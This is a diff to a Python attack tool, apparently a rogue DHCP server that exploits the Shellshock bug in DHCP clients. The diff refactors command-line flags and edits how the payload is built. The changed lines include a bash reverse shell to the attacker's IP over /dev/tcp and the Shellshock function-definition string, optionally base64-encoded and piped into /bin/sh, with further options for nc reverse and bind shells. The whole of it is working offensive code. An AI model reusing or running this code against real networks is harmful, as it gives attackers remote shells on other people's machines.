@@ -24,12 +24,8 @@ parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bin
 parser.add_argument('-N', '--nc_reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
 parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use bash reverse tcp shell in DHCP client')
 parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
-parser.add_argument('-n', '--config_network', type=int, help='0 - do not add network configure in payload, '
-                                                             '1 - add network configure in payload, '
-                                                             'default=1', default=1)
-parser.add_argument('-B', '--base64_encode', type=int, help='0 - do not use base64 encode in payload, '
-                                                            '1 - use base64 encode in payload, '
-                                                            'default=1', default=1)
+parser.add_argument('-n', '--without_network', action='store_true', help='do not add network configure in payload')
+parser.add_argument('-B', '--without_base64', action='store_true', help='do not use base64 encode in payload')
 
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
@@ -281,16 +277,18 @@ def dhcp_reply(request):
 
                 if args.bash_reverse_shell:
                     payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
-                              "/" + str(args.reverse_port) + " 0>&1"
+                              "/" + str(args.reverse_port) + " 0>&1 &"
 
                 if payload is not None:
-                    if args.config_network == 1:
+
+                    if not args.without_network:
                         payload = net_settings + payload
-                    if args.base64_encode == 1:
+
+                    if args.without_base64:
+                        shellshock_url = "() { :" + "; }; " + payload
+                    else:
                         payload = b64encode(payload)
                         shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
-                    else:
-                        shellshock_url = "() { :" + "; }; " + payload
 
                 if len(shellshock_url) > 255:
                     print "[ERROR] Len of command is very big! Current len: " + str(len(shellshock_url))
